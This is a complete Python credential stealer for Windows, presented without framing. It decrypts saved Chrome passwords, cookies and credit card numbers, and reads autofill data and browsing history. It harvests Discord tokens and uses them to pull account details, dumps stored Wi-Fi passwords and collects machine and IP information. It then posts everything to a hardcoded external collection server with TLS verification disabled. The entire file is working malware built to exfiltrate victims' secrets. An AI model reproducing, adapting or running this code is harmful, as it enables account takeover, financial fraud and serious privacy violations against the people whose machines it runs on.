import os
import shutil
import sqlite3
import json
import base64
import win32crypt
from Crypto.Cipher import AES
import re
import requests
import platform
import socket
import uuid
import subprocess
import time
import urllib3
from datetime import datetime, timedelta
from colorama import Fore, Style, init

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

init(autoreset=True)


class Chrome:
    def __init__(self):
        self.path = None
        self.local_state_path = None
        self.local_state = None
        self.db_path = None

    def get_chrome_db_path(self):
        self.path = os.path.join(
            os.environ['USERPROFILE'], 'AppData', 'Local',
            'Google', 'Chrome', 'User Data', 'Default', 'Login Data'
        )
        return self.path
    
    def get_encryption_key(self):
        self.local_state_path = os.path.join(
            os.environ['USERPROFILE'], 'AppData', 'Local',
            'Google', 'Chrome', 'User Data', 'Local State'
        )
        with open(self.local_state_path, 'r', encoding='utf-8') as f:
            self.local_state = json.load(f)
        key = base64.b64decode(self.local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    
    def decrypt_password(self, buff, key):
        if not buff:
            return ""
        try:
            if buff[:3] == b'v10':
                iv = buff[3:15]
                payload = buff[15:]
                cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
                decrypted = cipher.decrypt(payload)[:-16].decode('utf-8')
                return decrypted
            else:
                return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode()
        except Exception:
            return ""

    def extract_passwords(self):
        temp_db_path = None
        try:
            self.db_path = self.get_chrome_db_path()
            temp_db_path = "ChromeData.db"
            shutil.copyfile(self.db_path, temp_db_path)
            db = sqlite3.connect(temp_db_path)
            cursor = db.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            key = self.get_encryption_key()
            results = []
            for row in cursor.fetchall():
                url, username, encrypted = row
                password = self.decrypt_password(encrypted, key)
                if username or password:
                    results.append({
                        "url": url,
                        "username": username,
                        "password": password
                    })
            cursor.close()
            db.close()
            return results
        except Exception:
            return []
        finally:
            if temp_db_path and os.path.exists(temp_db_path):
                try:
                    os.remove(temp_db_path)
                except:
                    pass
    
    def get_browser_cookies(self):
        browser_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local',
                                   'Google', 'Chrome', 'User Data', 'Default', 'Cookies')
        cookies_data = []
        temp_path = None
        
        if not os.path.exists(browser_path):
            return cookies_data
        
        try:
            temp_path = "Cookies_temp.db"
            shutil.copyfile(browser_path, temp_path)
            
            local_state_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local',
                                           'Google', 'Chrome', 'User Data', 'Local State')
            key = None
            if os.path.exists(local_state_path):
                with open(local_state_path, 'r', encoding='utf-8') as f:
                    local_state = json.load(f)
                key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
                key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
            
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            
            cursor.execute("SELECT host_key, name, value, encrypted_value, path, expires_utc, is_secure FROM cookies")
            
            for host_key, name, value, encrypted_value, path, expires_utc, is_secure in cursor.fetchall():
                decrypted_value = value
                if encrypted_value and key:
                    try:
                        if encrypted_value[:3] == b'v10':
                            iv = encrypted_value[3:15]
                            payload = encrypted_value[15:]
                            cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
                            decrypted_value = cipher.decrypt(payload)[:-16].decode('utf-8')
                        else:
                            decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
                    except:
                        pass
                
                cookies_data.append({
                    'domain': host_key,
                    'name': name,
                    'value': decrypted_value,
                    'path': path,
                    'secure': bool(is_secure)
                })
            
            cursor.close()
            conn.close()
            
        except Exception:
            pass
        finally:
            if temp_path and os.path.exists(temp_path):
                try:
                    os.remove(temp_path)
                except:
                    pass
        
        return cookies_data
    
    def get_chrome_history(self):
        history_data = []
        temp_history_path = None
        
        history_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local',
                                   'Google', 'Chrome', 'User Data', 'Default', 'History')
        
        if not os.path.exists(history_path):
            return history_data
        
        try:
            temp_history_path = "History.db"
            shutil.copyfile(history_path, temp_history_path)
            
            conn = sqlite3.connect(temp_history_path)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT url, title, visit_count, last_visit_time 
                FROM urls 
                ORDER BY last_visit_time DESC 
                LIMIT 1000
            """)
            
            for url, title, visit_count, last_visit_time in cursor.fetchall():
                visit_date = datetime(1601, 1, 1) + timedelta(microseconds=last_visit_time)
                visit_str = visit_date.strftime('%Y-%m-%d %H:%M:%S')
                
                history_data.append({
                    'url': url,
                    'title': title,
                    'visit_count': visit_count,
                    'last_visit': visit_str
                })
            
            cursor.close()
            conn.close()
            
        except Exception:
            pass
        finally:
            if temp_history_path and os.path.exists(temp_history_path):
                try:
                    os.remove(temp_history_path)
                except:
                    pass
        
        return history_data

    def get_credit_cards(self):
        cards_data = []
        temp_db_path = None
        
        try:
            cards_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local',
                                     'Google', 'Chrome', 'User Data', 'Default', 'Web Data')
            
            if not os.path.exists(cards_path):
                return cards_data
            
            temp_db_path = "WebData_cards.db"
            shutil.copyfile(cards_path, temp_db_path)
            
            key = self.get_encryption_key()
            
            conn = sqlite3.connect(temp_db_path)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT name_on_card, expiration_month, expiration_year, 
                       card_number_encrypted, date_modified 
                FROM credit_cards
            """)
            
            for name, exp_month, exp_year, encrypted_card, date_modified in cursor.fetchall():
                decrypted_card = "DECRYPT_FAILED"
                
                if encrypted_card and key:
                    try:
                        if encrypted_card[:3] == b'v10':
                            iv = encrypted_card[3:15]
                            payload = encrypted_card[15:]
                            cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
                            decrypted_card = cipher.decrypt(payload)[:-16].decode('utf-8')
                        else:
                            decrypted_card = win32crypt.CryptUnprotectData(encrypted_card, None, None, None, 0)[1].decode()
                    except:
                        pass
                
                mod_date = datetime(1601, 1, 1) + timedelta(microseconds=date_modified) if date_modified else None
                
                cards_data.append({
                    'name': name,
                    'card_number': decrypted_card,
                    'expiry': f"{exp_month}/{exp_year}",
                    'last_modified': mod_date.strftime('%Y-%m-%d %H:%M:%S') if mod_date else "Unknown"
                })
            
            cursor.close()
            conn.close()
            
        except Exception:
            pass
        finally:
            if temp_db_path and os.path.exists(temp_db_path):
                try:
                    os.remove(temp_db_path)
                except:
                    pass
        
        return cards_data

    def get_autofill_data(self):
        autofill_data = []
        temp_db_path = None
        
        try:
            autofill_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local',
                                        'Google', 'Chrome', 'User Data', 'Default', 'Web Data')
            
            if not os.path.exists(autofill_path):
                return autofill_data
            
            temp_db_path = "WebData_autofill.db"
            shutil.copyfile(autofill_path, temp_db_path)
            
            conn = sqlite3.connect(temp_db_path)
            cursor = conn.cursor()
            
            cursor.execute("SELECT name, value, date_created, date_last_used FROM autofill")
            
            for name, value, created, last_used in cursor.fetchall():
                created_date = datetime(1601, 1, 1) + timedelta(microseconds=created) if created else None
                used_date = datetime(1601, 1, 1) + timedelta(microseconds=last_used) if last_used else None
                
                autofill_data.append({
                    'field': name,
                    'value': value,
                    'first_saved': created_date.strftime('%Y-%m-%d %H:%M:%S') if created_date else "Unknown",
                    'last_used': used_date.strftime('%Y-%m-%d %H:%M:%S') if used_date else "Never"
                })
            
            cursor.close()
            conn.close()
            
        except Exception:
            pass
        finally:
            if temp_db_path and os.path.exists(temp_db_path):
                try:
                    os.remove(temp_db_path)
                except:
                    pass
        
        return autofill_data
        
    def main(self):
        passwords = self.extract_passwords()
        cookies = self.get_browser_cookies()
        history = self.get_chrome_history()
        cards = self.get_credit_cards()
        autofill = self.get_autofill_data()

        return {
            'passwords': passwords,
            'cookies': cookies,
            'history': history,
            'credit_cards': cards,
            'autofill': autofill
        }


class Grabber:
    def __init__(self, server_url, username: str = "", password: str = ""):
        self.LOCAL = os.getenv("LOCALAPPDATA")
        self.ROAMING = os.getenv("APPDATA")
        self.PATHS = {
            'Discord': self.ROAMING + '\\Discord',
            'Discord Canary': self.ROAMING + '\\discordcanary',
            'Discord PTB': self.ROAMING + '\\discordptb',
            'Discord Development': self.ROAMING + '\\discorddevelopment'
        }
        self.server_url = server_url
        self.username = username
        self.password = password

    def find_discord_tokens(self):
        tokens = []
        for platform, path in self.PATHS.items():
            if not os.path.exists(path):
                continue
            
            leveldb_path = os.path.join(path, 'Local Storage', 'leveldb')
            if not os.path.exists(leveldb_path):
                continue
            
            for file in os.listdir(leveldb_path):
                if not file.endswith('.ldb') and not file.endswith('.log'):
                    continue
                
                try:
                    with open(os.path.join(leveldb_path, file), 'r', errors='ignore') as f:
                        content = f.read()
                        found_tokens = re.findall(r'[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}', content)
                        tokens.extend(found_tokens)
                except:
                    continue
        
        return list(set(tokens))

    def get_discord_user_info(self, token):
        try:
            headers = {
                'Authorization': token,
                'Content-Type': 'application/json'
            }
            
            user_response = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=10)
            if user_response.status_code != 200:
                return None
            
            user_data = user_response.json()
            
            guilds_response = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=headers, timeout=10)
            guilds = []
            if guilds_response.status_code == 200:
                guilds = [guild['id'] for guild in guilds_response.json()]
            
            nitro_response = requests.get('https://discord.com/api/v9/users/@me/billing/subscriptions', headers=headers, timeout=10)
            has_nitro = nitro_response.status_code == 200 and len(nitro_response.json()) > 0
            
            return {
                'token': token,
                'email': user_data.get('email'),
                'phone': user_data.get('phone'),
                'username': f"{user_data.get('username')}#{user_data.get('discriminator')}",
                'id': user_data.get('id'),
                'hasNitro': has_nitro,
                'servers': guilds,
                'avatar': f"https://cdn.discordapp.com/avatars/{user_data.get('id')}/{user_data.get('avatar')}.png" if user_data.get('avatar') else None
            }
        except:
            return None

    def get_pc_data(self):
        pc_data = {
            'computer_name': os.getenv('COMPUTERNAME', 'unknown_pc'),
            'username': os.getenv('USERNAME', 'unknown_user'),
            'os': platform.system(),
            'os_version': platform.version(),
            'processor': platform.processor(),
            'hostname': socket.gethostname(),
            'mac_address': ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,8*6,8)][::-1]),
            'architecture': platform.architecture()[0],
            'platform': platform.platform()
        }
        return pc_data

    def get_wifi_passwords(self):
        wifi_data = []
        
        try:
            result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], 
                                capture_output=True, text=True, encoding='utf-8')
            
            profiles = re.findall(r'All User Profile\s+:\s+(.*)', result.stdout)
            
            for profile in profiles:
                profile = profile.strip()
                if not profile:
                    continue
                    
                try:
                    result = subprocess.run(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'],
                                        capture_output=True, text=True, encoding='utf-8')
                    
                    password_match = re.search(r'Key Content\s+:\s+(.*)', result.stdout)
                    password = password_match.group(1).strip() if password_match else "No password"
                    
                    wifi_data.append({
                        'ssid': profile,
                        'password': password
                    })
                except:
                    wifi_data.append({
                        'ssid': profile,
                        'password': 'Error retrieving password'
                    })
                    
        except Exception as e:
            wifi_data.append({
                'ssid': 'Error',
                'password': f'Failed to get WiFi data: {str(e)}'
            })
        
        return wifi_data
    
    def get_ip_info(self):
        try:
            response = requests.get('https://ipinfo.io/json', timeout=10)
            if response.status_code == 200:
                return response.json()
            return {}
        except:
            return {}

    def grab_all_data(self):
        chrome = Chrome()
        chrome_data = chrome.main()
        
        username = os.getenv('USERNAME') or os.getenv('USER') or 'unknown'
        
        discord_tokens = self.find_discord_tokens()
        discord_data = {}
        
        for token in discord_tokens:
            user_info = self.get_discord_user_info(token)
            if user_info:
                discord_data = user_info
                break

        pc_data = self.get_pc_data()
        wifi_data = self.get_wifi_passwords()
        ip_info = self.get_ip_info()
        
        final_data = {
            'username': self.username,
            'password': self.password,
            'pc': pc_data,
            'wifi': wifi_data,
            'ip': ip_info,
            'pulled': {
                'discord': discord_data,
                'chrome': chrome_data
            }
        }
        
        return self.send_data_to_server(final_data)

    def send_data_to_server(self, data):
        try:
            response = requests.post(
                self.server_url,
                json=data,
                headers={'Content-Type': 'application/json'},
                timeout=30,
                verify=False  
            )
            return response.status_code == 200
        except:
            return False

class Grabbbbbber:
    def main(self):
        self.grabber = Grabber(server_url="http://vynxy.pythonanywhere.com/receive-data", username=os.getenv('USERNAME') or os.getenv('USER') or 'unknown', password="N/A")
        success = self.grabber.grab_all_data()
            
class Main:
    def __init__(self):
        self.grabs = Grabbbbbber()

    def run(self):
        self.grabs.main()
        

if __name__ == "__main__":
    main = Main()
    main.run()